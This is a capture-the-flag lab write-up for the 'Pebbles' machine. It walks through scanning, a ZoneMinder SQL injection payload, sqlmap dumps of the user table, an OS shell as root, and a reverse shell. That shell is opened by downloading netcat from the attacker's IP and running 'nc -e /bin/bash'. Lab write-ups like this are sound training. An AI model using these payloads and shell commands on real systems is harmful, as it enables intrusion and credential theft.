---
layout: default
title: Pebbles
parent: Proving Grounds Practice - Linux
nav_order: 1
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.52
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 21:06 EST
Nmap scan report for 192.168.232.52
Host is up (0.057s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/pebbles/index.png)

Gobuster discovered _/zm_ directory

![zm](../../../assets/images/ctfs/proving_grounds/pebbles/zm.png)

Searchsploit indicates there is an exploit for _ZoneMinder v1.29_

```bash
──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ searchsploit zoneminder
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
ZoneMinder 1.24.3 - Remote File Inclusion                             | php/webapps/17593.txt
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session | php/webapps/41239.txt
ZoneMinder 1.32.3 - Cross-Site Scripting                              | php/webapps/47060.txt
Zoneminder < v1.37.24 - Log Injection & Stored XSS & CSRF Bypass      | php/webapps/51071.py
ZoneMinder Video Server - packageControl Command Execution (Metasploi | unix/remote/24310.rb

```

The SQL Injection portion of exploit _41239_ indicates the following payload will trigger SQL Injection

```bash
view=request&request=log&task=query&limit=100;(SELECT FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
```

![sql1](../../../assets/images/ctfs/proving_grounds/pebbles/sql1.png)

Intercept in Burp to get the payload for SQLmap

![burp1](../../../assets/images/ctfs/proving_grounds/pebbles/burp1.png)

Running SQLmap returns several databases, including _zm_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ sqlmap http://192.168.232.52/zm/ --data="view=request&request=log&task=query&limit=100" --dump --batch --dbms=mysql --dbs --threads 5

[22:40:21] [INFO] fetching current database
[22:40:21] [INFO] retrieved: zm
[22:40:31] [INFO] fetching tables for database: 'zm'
[22:40:31] [INFO] fetching number of tables for database 'zm'
[22:40:31] [INFO] resumed: 18
[22:40:31] [INFO] resumed: Config
[22:40:31] [INFO] resumed: ControlPresets
[22:40:31] [INFO] resumed: Controls
[22:40:31] [INFO] resumed: Devices
[22:40:31] [INFO] resumed: Events
[22:40:31] [INFO] resumed: Filters
[22:40:31] [INFO] resumed: Frames
[22:40:31] [INFO] resumed: Groups
[22:40:31] [INFO] resumed: Logs
[22:40:31] [INFO] resumed: MonitorPresets
[22:40:31] [INFO] resumed: Monitors
[22:40:31] [INFO] resumed: Servers
[22:40:31] [INFO] resumed: States
[22:40:31] [INFO] resumed: Stats
[22:40:31] [INFO] resumed: TriggersX10
[22:40:31] [INFO] resumed: Users
[22:40:31] [INFO] resumed: ZonePresets
[22:40:31] [INFO] resumed: Zones

```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]                                           [296/460]
└─$ sqlmap http://192.168.232.52/zm/ --data="view=request&request=log&task=query&limit=100" -D zm --tabl
es --threads 5

Database: zm
[18 tables]
+----------------+
| Config         |
| ControlPresets |
| Controls       |
| Devices        |
| Events         |
| Filters        |
| Frames         |
| Logs           |
| MonitorPresets |
| Monitors       |
| Servers        |
| States         |
| Stats          |
| TriggersX10    |
| Users          |
| ZonePresets    |
| Zones          |
| Groups         |
+----------------+
```

We use SQLMap to then get the contents of the _Users_ table which turns out to be the _admin_ user.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ sqlmap http://192.168.232.52/zm/ --data="view=request&request=log&task=query&limit=100" -D zm -T Use
rs --dump --batch --dbms=mysql --dbs --threads 5

[22:58:47] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[22:58:47] [INFO] using hash method 'mysql_passwd'
[22:58:47] [INFO] resuming password 'admin' for hash '*4acfe3202a5ff5cf467898fc58aab1d615029441' for user 'admin'
Database: zm
Table: Users
[1 entry]
+----+--------+--------+---------+---------+---------+----------+---------------------------------------------------+----------+----------+----------+------------+------------+--------------+
| Id | Events | Stream | Control | Devices | Enabled | Monitors | Password                                          | Username | Groups   | System   | MonitorIds | Language   | MaxBandwidth |
+----+--------+--------+---------+---------+---------+----------+---------------------------------------------------+----------+----------+----------+------------+------------+--------------+
| 1  | Edit   | View   | Edit    | Edit    | 1       | Edit     | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 (admin) | admin    | Edit     | Edit     | <blank>    | <blank>    | <blank>      |
+----+--------+--------+---------+---------+---------+----------+---------------------------------------------------+----------+----------+----------+------------+------------+--------------+


```

# Exploitation

---

We can now use the _--os-shell_ flag to get a shell on the box through SQLMap

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ sqlmap http://192.168.232.52/zm/ --data="view=request&request=log&task=query&limit=100" --os-shell

[23:06:03] [INFO] creating UDF 'sys_exec' from the binary UDF file
[23:06:03] [INFO] creating UDF 'sys_eval' from the binary UDF file
[23:06:03] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[23:06:03] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a]
[23:06:29] [INFO] retrieved: root
command standard output: 'root'

```

# Post-Exploitation

---

We have a root shell but can get a more stable shell by downloading netcat and sending a reverse shell back to our attack box.

```bash
os-shell> wget "http://192.168.45.217/nc" -O /tmp/nc
do you want to retrieve the command standard output? [Y/n/a] n
os-shell> chmod +x /tmp/nc
do you want to retrieve the command standard output? [Y/n/a] n
os-shell> /tmp/nc 192.168.45.217 80 -e /bin/bash
do you want to retrieve the command standard output? [Y/n/a] n

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pebbles]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.52] 44992
id
uid=0(root) gid=0(root) groups=0(root)



```
